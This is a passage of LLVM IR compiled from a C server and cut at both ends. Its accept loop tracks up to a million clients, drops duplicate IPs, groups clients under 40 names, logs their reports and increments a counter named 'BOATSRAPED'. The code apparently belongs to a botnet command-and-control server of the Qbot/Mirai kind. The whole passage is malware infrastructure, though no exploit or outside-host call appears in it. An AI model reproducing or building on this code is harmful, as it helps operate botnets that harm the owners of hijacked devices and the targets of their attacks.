  %44 = sext i32 %43 to i64
  %45 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %42, i64 %44
  %46 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %45, i32 0, i32 0
  %47 = load i32, i32* %46, align 1
  %48 = and i32 %47, 16
  %49 = icmp ne i32 %48, 0
  br i1 %49, label %59, label %50

50:                                               ; preds = %41
  %51 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %52 = load i32, i32* %7, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %51, i64 %53
  %55 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %54, i32 0, i32 0
  %56 = load i32, i32* %55, align 1
  %57 = and i32 %56, 1
  %58 = icmp ne i32 %57, 0
  br i1 %58, label %78, label %59

59:                                               ; preds = %50, %41, %32
  %60 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %61 = load i32, i32* %7, align 4
  %62 = sext i32 %61 to i64
  %63 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %60, i64 %62
  %64 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %63, i32 0, i32 1
  %65 = bitcast %union.epoll_data* %64 to i32*
  %66 = load i32, i32* %65, align 1
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %67
  %69 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %68, i32 0, i32 3
  store i8 0, i8* %69, align 1
  %70 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %71 = load i32, i32* %7, align 4
  %72 = sext i32 %71 to i64
  %73 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %70, i64 %72
  %74 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %73, i32 0, i32 1
  %75 = bitcast %union.epoll_data* %74 to i32*
  %76 = load i32, i32* %75, align 1
  %77 = call i32 @close(i32 noundef %76)
  br label %340

78:                                               ; preds = %50
  %79 = load volatile i32, i32* @listenFD, align 4
  %80 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %81 = load i32, i32* %7, align 4
  %82 = sext i32 %81 to i64
  %83 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %80, i64 %82
  %84 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %83, i32 0, i32 1
  %85 = bitcast %union.epoll_data* %84 to i32*
  %86 = load i32, i32* %85, align 1
  %87 = icmp eq i32 %79, %86
  br i1 %87, label %88, label %238

88:                                               ; preds = %78
  br label %89

89:                                               ; preds = %232, %208, %205, %88
  store i32 16, i32* %9, align 4
  %90 = load volatile i32, i32* @listenFD, align 4
  %91 = call i32 @accept(i32 noundef %90, %struct.sockaddr* noundef %8, i32* noundef %9)
  store i32 %91, i32* %10, align 4
  %92 = load i32, i32* %10, align 4
  %93 = icmp eq i32 %92, -1
  br i1 %93, label %94, label %104

94:                                               ; preds = %89
  %95 = call i32* @__errno_location() #10
  %96 = load i32, i32* %95, align 4
  %97 = icmp eq i32 %96, 11
  br i1 %97, label %102, label %98

98:                                               ; preds = %94
  %99 = call i32* @__errno_location() #10
  %100 = load i32, i32* %99, align 4
  %101 = icmp eq i32 %100, 11
  br i1 %101, label %102, label %103

102:                                              ; preds = %98, %94
  br label %237

103:                                              ; preds = %98
  call void @perror(i8* noundef getelementptr inbounds ([7 x i8], [7 x i8]* @.str.5, i64 0, i64 0))
  br label %237

104:                                              ; preds = %89
  %105 = bitcast %struct.sockaddr* %8 to %struct.sockaddr_in*
  %106 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %105, i32 0, i32 2
  %107 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %106, i32 0, i32 0
  %108 = load i32, i32* %107, align 2
  %109 = load i32, i32* %10, align 4
  %110 = sext i32 %109 to i64
  %111 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %110
  %112 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %111, i32 0, i32 0
  store i32 %108, i32* %112, align 4
  %113 = getelementptr inbounds [200 x i8], [200 x i8]* %12, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %113, i8 0, i64 200, i1 false)
  %114 = getelementptr inbounds [200 x i8], [200 x i8]* %12, i64 0, i64 0
  %115 = load i32, i32* %10, align 4
  %116 = call i32 @fdgets(i8* noundef %114, i32 noundef 200, i32 noundef %115)
  %117 = getelementptr inbounds [200 x i8], [200 x i8]* %12, i64 0, i64 0
  %118 = call i8* @strstr(i8* noundef %117, i8* noundef getelementptr inbounds ([6 x i8], [6 x i8]* @.str.6, i64 0, i64 0)) #9
  %119 = icmp ne i8* %118, null
  br i1 %119, label %120, label %165

120:                                              ; preds = %104
  %121 = getelementptr inbounds [200 x i8], [200 x i8]* %12, i64 0, i64 0
  call void @trim(i8* noundef %121)
  %122 = getelementptr inbounds [200 x i8], [200 x i8]* %12, i64 0, i64 0
  call void @removestr(i8* noundef %122, i8* noundef getelementptr inbounds ([6 x i8], [6 x i8]* @.str.6, i64 0, i64 0))
  %123 = load i32, i32* %10, align 4
  %124 = sext i32 %123 to i64
  %125 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %124
  %126 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %125, i32 0, i32 2
  %127 = getelementptr inbounds [512 x i8], [512 x i8]* %126, i64 0, i64 0
  %128 = getelementptr inbounds [200 x i8], [200 x i8]* %12, i64 0, i64 0
  %129 = call i8* @strcpy(i8* noundef %127, i8* noundef %128) #11
  store i32 0, i32* %13, align 4
  br label %130

130:                                              ; preds = %161, %120
  %131 = load i32, i32* %13, align 4
  %132 = icmp slt i32 %131, 40
  br i1 %132, label %133, label %164

133:                                              ; preds = %130
  %134 = load i32, i32* %13, align 4
  %135 = sext i32 %134 to i64
  %136 = getelementptr inbounds [40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 %135
  %137 = getelementptr inbounds %struct.name, %struct.name* %136, i32 0, i32 0
  %138 = getelementptr inbounds [512 x i8], [512 x i8]* %137, i64 0, i64 0
  %139 = getelementptr inbounds [200 x i8], [200 x i8]* %12, i64 0, i64 0
  %140 = call i32 @strcmp(i8* noundef %138, i8* noundef %139) #9
  %141 = icmp ne i32 %140, 0
  br i1 %141, label %144, label %142

142:                                              ; preds = %133
  %143 = call i32 @usleep(i32 noundef 40000)
  br label %164

144:                                              ; preds = %133
  %145 = load i32, i32* %13, align 4
  %146 = sext i32 %145 to i64
  %147 = getelementptr inbounds [40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 %146
  %148 = getelementptr inbounds %struct.name, %struct.name* %147, i32 0, i32 0
  %149 = getelementptr inbounds [512 x i8], [512 x i8]* %148, i64 0, i64 0
  %150 = call i64 @strlen(i8* noundef %149) #9
  %151 = icmp ule i64 %150, 0
  br i1 %151, label %152, label %160

152:                                              ; preds = %144
  %153 = load i32, i32* %13, align 4
  %154 = sext i32 %153 to i64
  %155 = getelementptr inbounds [40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 %154
  %156 = getelementptr inbounds %struct.name, %struct.name* %155, i32 0, i32 0
  %157 = getelementptr inbounds [512 x i8], [512 x i8]* %156, i64 0, i64 0
  %158 = getelementptr inbounds [200 x i8], [200 x i8]* %12, i64 0, i64 0
  %159 = call i8* @strcpy(i8* noundef %157, i8* noundef %158) #11
  br label %164

160:                                              ; preds = %144
  br label %161

161:                                              ; preds = %160
  %162 = load i32, i32* %13, align 4
  %163 = add nsw i32 %162, 1
  store i32 %163, i32* %13, align 4
  br label %130, !llvm.loop !12

164:                                              ; preds = %152, %142, %130
  br label %165

165:                                              ; preds = %164, %104
  store i32 0, i32* %14, align 4
  store i32 0, i32* %11, align 4
  br label %166

166:                                              ; preds = %195, %165
  %167 = load i32, i32* %11, align 4
  %168 = icmp slt i32 %167, 1000000
  br i1 %168, label %169, label %198

169:                                              ; preds = %166
  %170 = load i32, i32* %11, align 4
  %171 = sext i32 %170 to i64
  %172 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %171
  %173 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %172, i32 0, i32 3
  %174 = load i8, i8* %173, align 1
  %175 = icmp ne i8 %174, 0
  br i1 %175, label %176, label %180

176:                                              ; preds = %169
  %177 = load i32, i32* %11, align 4
  %178 = load i32, i32* %10, align 4
  %179 = icmp eq i32 %177, %178
  br i1 %179, label %180, label %181

180:                                              ; preds = %176, %169
  br label %195

181:                                              ; preds = %176
  %182 = load i32, i32* %11, align 4
  %183 = sext i32 %182 to i64
  %184 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %183
  %185 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %184, i32 0, i32 0
  %186 = load i32, i32* %185, align 4
  %187 = load i32, i32* %10, align 4
  %188 = sext i32 %187 to i64
  %189 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %188
  %190 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %189, i32 0, i32 0
  %191 = load i32, i32* %190, align 4
  %192 = icmp eq i32 %186, %191
  br i1 %192, label %193, label %194

193:                                              ; preds = %181
  store i32 1, i32* %14, align 4
  br label %198

194:                                              ; preds = %181
  br label %195

195:                                              ; preds = %194, %180
  %196 = load i32, i32* %11, align 4
  %197 = add nsw i32 %196, 1
  store i32 %197, i32* %11, align 4
  br label %166, !llvm.loop !13

198:                                              ; preds = %193, %166
  %199 = load i32, i32* %14, align 4
  %200 = icmp ne i32 %199, 0
  br i1 %200, label %201, label %211

201:                                              ; preds = %198
  %202 = load i32, i32* %10, align 4
  %203 = call i64 @send(i32 noundef %202, i8* noundef getelementptr inbounds ([9 x i8], [9 x i8]* @.str.7, i64 0, i64 0), i64 noundef 8, i32 noundef 16384)
  %204 = icmp eq i64 %203, -1
  br i1 %204, label %205, label %208

205:                                              ; preds = %201
  %206 = load i32, i32* %10, align 4
  %207 = call i32 @close(i32 noundef %206)
  br label %89

208:                                              ; preds = %201
  %209 = load i32, i32* %10, align 4
  %210 = call i32 @close(i32 noundef %209)
  br label %89

211:                                              ; preds = %198
  %212 = load i32, i32* %10, align 4
  %213 = call i32 @make_socket_non_blocking(i32 noundef %212)
  store i32 %213, i32* %5, align 4
  %214 = load i32, i32* %5, align 4
  %215 = icmp eq i32 %214, -1
  br i1 %215, label %216, label %219

216:                                              ; preds = %211
  %217 = load i32, i32* %10, align 4
  %218 = call i32 @close(i32 noundef %217)
  br label %237

219:                                              ; preds = %211
  %220 = load i32, i32* %10, align 4
  %221 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %3, i32 0, i32 1
  %222 = bitcast %union.epoll_data* %221 to i32*
  store i32 %220, i32* %222, align 1
  %223 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %3, i32 0, i32 0
  store i32 -2147483647, i32* %223, align 1
  %224 = load volatile i32, i32* @epollFD, align 4
  %225 = load i32, i32* %10, align 4
  %226 = call i32 @epoll_ctl(i32 noundef %224, i32 noundef 1, i32 noundef %225, %struct.epoll_event* noundef %3) #11
  store i32 %226, i32* %5, align 4
  %227 = load i32, i32* %5, align 4
  %228 = icmp eq i32 %227, -1
  br i1 %228, label %229, label %232

229:                                              ; preds = %219
  call void @perror(i8* noundef getelementptr inbounds ([10 x i8], [10 x i8]* @.str.8, i64 0, i64 0))
  %230 = load i32, i32* %10, align 4
  %231 = call i32 @close(i32 noundef %230)
  br label %237

232:                                              ; preds = %219
  %233 = load i32, i32* %10, align 4
  %234 = sext i32 %233 to i64
  %235 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %234
  %236 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %235, i32 0, i32 3
  store i8 1, i8* %236, align 1
  br label %89

237:                                              ; preds = %229, %216, %103, %102
  br label %340

238:                                              ; preds = %78
  %239 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %240 = load i32, i32* %7, align 4
  %241 = sext i32 %240 to i64
  %242 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %239, i64 %241
  %243 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %242, i32 0, i32 1
  %244 = bitcast %union.epoll_data* %243 to i32*
  %245 = load i32, i32* %244, align 1
  store i32 %245, i32* %15, align 4
  %246 = load i32, i32* %15, align 4
  %247 = sext i32 %246 to i64
  %248 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %247
  store %struct.clientdata_t* %248, %struct.clientdata_t** %16, align 8
  store i32 0, i32* %17, align 4
  %249 = load %struct.clientdata_t*, %struct.clientdata_t** %16, align 8
  %250 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %249, i32 0, i32 3
  store i8 1, i8* %250, align 1
  br label %251

251:                                              ; preds = %328, %238
  %252 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %252, i8 0, i64 2048, i1 false)
  br label %253

253:                                              ; preds = %313, %309, %304, %289, %275, %251
  %254 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %254, i8 0, i64 2048, i1 false)
  %255 = icmp ne i8* %254, null
  br i1 %255, label %256, label %262

256:                                              ; preds = %253
  %257 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i64 0, i64 0
  %258 = load i32, i32* %15, align 4
  %259 = call i32 @fdgets(i8* noundef %257, i32 noundef 2048, i32 noundef %258)
  %260 = sext i32 %259 to i64
  store i64 %260, i64* %18, align 8
  %261 = icmp sgt i64 %260, 0
  br label %262

262:                                              ; preds = %256, %253
  %263 = phi i1 [ false, %253 ], [ %261, %256 ]
  br i1 %263, label %264, label %314

264:                                              ; preds = %262
  %265 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i64 0, i64 0
  %266 = call i8* @strstr(i8* noundef %265, i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.4, i64 0, i64 0)) #9
  %267 = icmp eq i8* %266, null
  br i1 %267, label %268, label %269

268:                                              ; preds = %264
  store i32 1, i32* %17, align 4
  br label %314

269:                                              ; preds = %264
  %270 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i64 0, i64 0
  call void @trim(i8* noundef %270)
  %271 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i64 0, i64 0
  %272 = call i8* @strstr(i8* noundef %271, i8* noundef getelementptr inbounds ([8 x i8], [8 x i8]* @.str.9, i64 0, i64 0)) #9
  %273 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i64 0, i64 0
  %274 = icmp eq i8* %272, %273
  br i1 %274, label %275, label %284

275:                                              ; preds = %269
  %276 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i64 0, i64 0
  %277 = call i8* @strstr(i8* noundef %276, i8* noundef getelementptr inbounds ([8 x i8], [8 x i8]* @.str.9, i64 0, i64 0)) #9
  %278 = getelementptr inbounds i8, i8* %277, i64 7
  store i8* %278, i8** %20, align 8
  %279 = load %struct._IO_FILE*, %struct._IO_FILE** @fileFD, align 8
  %280 = load i8*, i8** %20, align 8
  %281 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* noundef %279, i8* noundef getelementptr inbounds ([4 x i8], [4 x i8]* @.str.10, i64 0, i64 0), i8* noundef %280)
  %282 = load %struct._IO_FILE*, %struct._IO_FILE** @fileFD, align 8
  %283 = call i32 @fflush(%struct._IO_FILE* noundef %282)
  br label %253, !llvm.loop !14

284:                                              ; preds = %269
  %285 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i64 0, i64 0
  %286 = call i8* @strstr(i8* noundef %285, i8* noundef getelementptr inbounds ([11 x i8], [11 x i8]* @.str.11, i64 0, i64 0)) #9
  %287 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i64 0, i64 0
  %288 = icmp eq i8* %286, %287
  br i1 %288, label %289, label %295

289:                                              ; preds = %284
  %290 = load volatile i32, i32* @BOATSRAPED, align 4
  %291 = add nsw i32 %290, 1
  store volatile i32 %291, i32* @BOATSRAPED, align 4
  %292 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i64 0, i64 0
  %293 = call i8* @strstr(i8* noundef %292, i8* noundef getelementptr inbounds ([11 x i8], [11 x i8]* @.str.11, i64 0, i64 0)) #9
  %294 = getelementptr inbounds i8, i8* %293, i64 11
  store i8* %294, i8** %21, align 8
  br label %253, !llvm.loop !14

295:                                              ; preds = %284
  %296 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i64 0, i64 0
  %297 = call i32 @strcmp(i8* noundef %296, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0)) #9
  %298 = icmp eq i32 %297, 0
  br i1 %298, label %299, label %305

299:                                              ; preds = %295
  %300 = load i32, i32* %15, align 4
  %301 = call i64 @send(i32 noundef %300, i8* noundef getelementptr inbounds ([6 x i8], [6 x i8]* @.str.12, i64 0, i64 0), i64 noundef 5, i32 noundef 16384)
  %302 = icmp eq i64 %301, -1
  br i1 %302, label %303, label %304

303:                                              ; preds = %299
  store i32 1, i32* %17, align 4
  br label %314

304:                                              ; preds = %299
  br label %253, !llvm.loop !14

305:                                              ; preds = %295
  %306 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i64 0, i64 0
  %307 = call i32 @strcmp(i8* noundef %306, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.13, i64 0, i64 0)) #9
  %308 = icmp eq i32 %307, 0
  br i1 %308, label %309, label %310

309:                                              ; preds = %305
  br label %253, !llvm.loop !14

310:                                              ; preds = %305
  %311 = getelementptr inbounds [2048 x i8], [2048 x i8]* %19, i64 0, i64 0
  %312 = call i32 (i8*, ...) @printf(i8* noundef getelementptr inbounds ([6 x i8], [6 x i8]* @.str.14, i64 0, i64 0), i8* noundef %311)
  br label %313

313:                                              ; preds = %310
  br label %253, !llvm.loop !14

314:                                              ; preds = %303, %268, %262
  %315 = load i64, i64* %18, align 8
  %316 = icmp eq i64 %315, -1
  br i1 %316, label %317, label %323

317:                                              ; preds = %314
  %318 = call i32* @__errno_location() #10
  %319 = load i32, i32* %318, align 4
  %320 = icmp ne i32 %319, 11
  br i1 %320, label %321, label %322

321:                                              ; preds = %317
  store i32 1, i32* %17, align 4
  br label %322

322:                                              ; preds = %321, %317
  br label %329

323:                                              ; preds = %314
  %324 = load i64, i64* %18, align 8
  %325 = icmp eq i64 %324, 0
  br i1 %325, label %326, label %327

326:                                              ; preds = %323
  store i32 1, i32* %17, align 4
  br label %329

327:                                              ; preds = %323
  br label %328

328:                                              ; preds = %327
  br label %251

329:                                              ; preds = %326, %322
  %330 = load i32, i32* %17, align 4
  %331 = icmp ne i32 %330, 0
  br i1 %331, label %332, label %337

332:                                              ; preds = %329
  %333 = load %struct.clientdata_t*, %struct.clientdata_t** %16, align 8
  %334 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %333, i32 0, i32 3
  store i8 0, i8* %334, align 1
  %335 = load i32, i32* %15, align 4
  %336 = call i32 @close(i32 noundef %335)
  br label %337

337:                                              ; preds = %332, %329
  br label %338

338:                                              ; preds = %337
  br label %339

339:                                              ; preds = %338
  br label %340

340:                                              ; preds = %339, %237, %59
  %341 = load i32, i32* %7, align 4
  %342 = add nsw i32 %341, 1
  store i32 %342, i32* %7, align 4
  br label %28, !llvm.loop !15

343:                                              ; preds = %28
  br label %24
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64 noundef, i64 noundef) #4

declare i32 @epoll_wait(i32 noundef, %struct.epoll_event* noundef, i32 noundef, i32 noundef) #1

declare i32 @close(i32 noundef) #1

declare i32 @accept(i32 noundef, %struct.sockaddr* noundef, i32* noundef) #1

; Function Attrs: nounwind readnone willreturn
declare i32* @__errno_location() #3

declare void @perror(i8* noundef) #1

declare i32 @usleep(i32 noundef) #1

; Function Attrs: noinline nounwind sspstrong uwtable
define internal i32 @make_socket_non_blocking(i32 noundef %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %6 = load i32, i32* %3, align 4
  %7 = call i32 (i32, i32, ...) @fcntl(i32 noundef %6, i32 noundef 3, i32 noundef 0)
  store i32 %7, i32* %4, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp eq i32 %8, -1
  br i1 %9, label %10, label %11

10:                                               ; preds = %1
  call void @perror(i8* noundef getelementptr inbounds ([6 x i8], [6 x i8]* @.str.108, i64 0, i64 0))
  store i32 -1, i32* %2, align 4
  br label %21

11:                                               ; preds = %1
  %12 = load i32, i32* %4, align 4
  %13 = or i32 %12, 2048
  store i32 %13, i32* %4, align 4
  %14 = load i32, i32* %3, align 4
  %15 = load i32, i32* %4, align 4
  %16 = call i32 (i32, i32, ...) @fcntl(i32 noundef %14, i32 noundef 4, i32 noundef %15)
  store i32 %16, i32* %5, align 4
  %17 = load i32, i32* %5, align 4
  %18 = icmp eq i32 %17, -1
  br i1 %18, label %19, label %20

19:                                               ; preds = %11
  call void @perror(i8* noundef getelementptr inbounds ([6 x i8], [6 x i8]* @.str.108, i64 0, i64 0))
  store i32 -1, i32* %2, align 4
  br label %21

20:                                               ; preds = %11
  store i32 0, i32* %2, align 4
  br label %21

21:                                               ; preds = %20, %19, %10
  %22 = load i32, i32* %2, align 4
  ret i32 %22
}

; Function Attrs: nounwind
declare i32 @epoll_ctl(i32 noundef, i32 noundef, i32 noundef, %struct.epoll_event* noundef) #4

declare i32 @fprintf(%struct._IO_FILE* noundef, i8* noundef, ...) #1

declare i32 @fflush(%struct._IO_FILE* noundef) #1

declare i32 @printf(i8* noundef, ...) #1

declare i32 @fcntl(i32 noundef, i32 noundef, ...) #1

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @clientsConnected() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  store i32 0, i32* %2, align 4
  store i32 0, i32* %1, align 4
  br label %3

3:                                                ; preds = %17, %0
  %4 = load i32, i32* %1, align 4
  %5 = icmp slt i32 %4, 1000000
  br i1 %5, label %6, label %20

6:                                                ; preds = %3
  %7 = load i32, i32* %1, align 4
  %8 = sext i32 %7 to i64
  %9 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %8
  %10 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %9, i32 0, i32 3
  %11 = load i8, i8* %10, align 1
  %12 = icmp ne i8 %11, 0
  br i1 %12, label %14, label %13

13:                                               ; preds = %6
  br label %17

14:                                               ; preds = %6
  %15 = load i32, i32* %2, align 4
  %16 = add nsw i32 %15, 1
  store i32 %16, i32* %2, align 4
  br label %17

17:                                               ; preds = %14, %13
  %18 = load i32, i32* %1, align 4
  %19 = add nsw i32 %18, 1
  store i32 %19, i32* %1, align 4
  br label %3, !llvm.loop !16

20:                                               ; preds = %3
  %21 = load i32, i32* %2, align 4
  ret i32 %21
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @joinn() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca [1000000 x i8], align 16
  store i32 0, i32* %4, align 4
  br label %6

6:                                                ; preds = %14, %0
  %7 = load i32, i32* %4, align 4
  %8 = icmp slt i32 %7, 40
  br i1 %8, label %9, label %17

9:                                                ; preds = %6
  %10 = load i32, i32* %4, align 4
  %11 = sext i32 %10 to i64
  %12 = getelementptr inbounds [40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 %11
  %13 = getelementptr inbounds %struct.name, %struct.name* %12, i32 0, i32 1
  store i32 0, i32* %13, align 4
  br label %14

14:                                               ; preds = %9
  %15 = load i32, i32* %4, align 4
  %16 = add nsw i32 %15, 1
  store i32 %16, i32* %4, align 4
  br label %6, !llvm.loop !17

17:                                               ; preds = %6
  store i32 0, i32* %2, align 4
  br label %18

18:                                               ; preds = %58, %17
  %19 = load i32, i32* %2, align 4
  %20 = icmp slt i32 %19, 1000000
  br i1 %20, label %21, label %61

21:                                               ; preds = %18
  store i32 0, i32* %3, align 4
  br label %22

22:                                               ; preds = %54, %21
  %23 = load i32, i32* %3, align 4
  %24 = icmp slt i32 %23, 40
  br i1 %24, label %25, label %57

25:                                               ; preds = %22
  %26 = load i32, i32* %2, align 4
  %27 = sext i32 %26 to i64
  %28 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %27
  %29 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %28, i32 0, i32 2
  %30 = getelementptr inbounds [512 x i8], [512 x i8]* %29, i64 0, i64 0
  %31 = load i32, i32* %3, align 4
  %32 = sext i32 %31 to i64
  %33 = getelementptr inbounds [40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 %32
  %34 = getelementptr inbounds %struct.name, %struct.name* %33, i32 0, i32 0
  %35 = getelementptr inbounds [512 x i8], [512 x i8]* %34, i64 0, i64 0
  %36 = call i32 @strcmp(i8* noundef %30, i8* noundef %35) #9
  %37 = icmp eq i32 %36, 0
  br i1 %37, label %38, label %53

38:                                               ; preds = %25
  %39 = load i32, i32* %2, align 4
  %40 = sext i32 %39 to i64
  %41 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %40
  %42 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %41, i32 0, i32 3
  %43 = load i8, i8* %42, align 1
  %44 = sext i8 %43 to i32
  %45 = icmp eq i32 %44, 1
  br i1 %45, label %46, label %53

46:                                               ; preds = %38
  %47 = load i32, i32* %3, align 4
  %48 = sext i32 %47 to i64
  %49 = getelementptr inbounds [40 x %struct.name], [40 x %struct.name]* @arra, i64 0, i64 %48
  %50 = getelementptr inbounds %struct.name, %struct.name* %49, i32 0, i32 1
  %51 = load i32, i32* %50, align 4
  %52 = add nsw i32 %51, 1
  store i32 %52, i32* %50, align 4
  br label %53

53:                                               ; preds = %46, %38, %25
  br label %54

54:                                               ; preds = %53
  %55 = load i32, i32* %3, align 4
  %56 = add nsw i32 %55, 1
  store i32 %56, i32* %3, align 4
  br label %22, !llvm.loop !18

57:                                               ; preds = %22
  br label %58

58:                                               ; preds = %57
  %59 = load i32, i32* %2, align 4
  %60 = add nsw i32 %59, 1
  store i32 %60, i32* %2, align 4
  br label %18, !llvm.loop !19

61:                                               ; preds = %18
  %62 = load i32, i32* %1, align 4
  ret i32 %62
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @Search_in_File(i8* noundef %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca %struct._IO_FILE*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [512 x i8], align 16
  store i8* %0, i8** %3, align 8
  store i32 0, i32* %5, align 4
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  %9 = call noalias %struct._IO_FILE* @fopen(i8* noundef getelementptr inbounds ([10 x i8], [10 x i8]* @.str.15, i64 0, i64 0), i8* noundef getelementptr inbounds ([2 x i8], [2 x i8]* @.str.16, i64 0, i64 0))
  store %struct._IO_FILE* %9, %struct._IO_FILE** %4, align 8
  %10 = icmp eq %struct._IO_FILE* %9, null
  br i1 %10, label %11, label %12

11:                                               ; preds = %1
  store i32 -1, i32* %2, align 4
  br label %42

12:                                               ; preds = %1
  br label %13

13:                                               ; preds = %27, %12
  %14 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 0
  %15 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %16 = call i8* @fgets(i8* noundef %14, i32 noundef 512, %struct._IO_FILE* noundef %15)
  %17 = icmp ne i8* %16, null
  br i1 %17, label %18, label %30

18:                                               ; preds = %13
  %19 = getelementptr inbounds [512 x i8], [512 x i8]* %8, i64 0, i64 0
  %20 = load i8*, i8** %3, align 8
  %21 = call i8* @strstr(i8* noundef %19, i8* noundef %20) #9
  %22 = icmp ne i8* %21, null
  br i1 %22, label %23, label %27

23:                                               ; preds = %18
  %24 = load i32, i32* %6, align 4
  %25 = add nsw i32 %24, 1
  store i32 %25, i32* %6, align 4
  %26 = load i32, i32* %5, align 4
  store i32 %26, i32* %7, align 4
  br label %27

27:                                               ; preds = %23, %18
  %28 = load i32, i32* %5, align 4
  %29 = add nsw i32 %28, 1
  store i32 %29, i32* %5, align 4
  br label %13, !llvm.loop !20

30:                                               ; preds = %13
  %31 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %32 = icmp ne %struct._IO_FILE* %31, null
  br i1 %32, label %33, label %36

33:                                               ; preds = %30
  %34 = load %struct._IO_FILE*, %struct._IO_FILE** %4, align 8
  %35 = call i32 @fclose(%struct._IO_FILE* noundef %34)
  br label %36

36:                                               ; preds = %33, %30
  %37 = load i32, i32* %6, align 4
  %38 = icmp eq i32 %37, 0
  br i1 %38, label %39, label %40

39:                                               ; preds = %36
  store i32 0, i32* %2, align 4
